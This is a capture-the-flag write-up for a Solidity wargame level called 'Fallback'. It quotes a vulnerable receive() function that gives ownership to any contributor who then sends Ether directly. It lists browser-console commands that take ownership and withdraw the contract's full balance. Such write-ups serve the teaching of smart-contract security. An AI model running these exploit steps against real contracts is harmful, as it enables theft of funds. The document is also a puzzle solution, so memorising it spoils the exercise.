# **Level 01 — Fallback**

## 🎯 Goal  
Take ownership of the contract and withdraw all funds.

## 💥 Vulnerability  
The contract incorrectly allows ownership to be transferred to anyone who:
1. Calls the `contribute()` function with a small amount of Ether (so their contribution is > 0 and < 0.001 ether),
2. Then sends Ether directly to the contract (triggering the receive() function).

The part of the vulnerable code:
```solidity 
// Solidity code 
receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
```

## 🛠 ️Solution (via browser console)
The following steps were executed:
```js
// JS console input 
// 0. Check current owner
contract.owner()

// 1. Make a small contribution
await contract.contribute({value: 100000000000000})

// 2. Verify contribution
(await contract.getContribution()).toString()

// 3. Take ownership by triggering receive 
await contract.sendTransaction({value: 100000000000000})

// 4. Confirm new ownership
contract.owner()

// 5. Withdraw all funds
await contract.withdraw()
```

## 🧙 Outcome
Ownership was successfully taken, and contract balance was drained using receive-based privilege escalation.
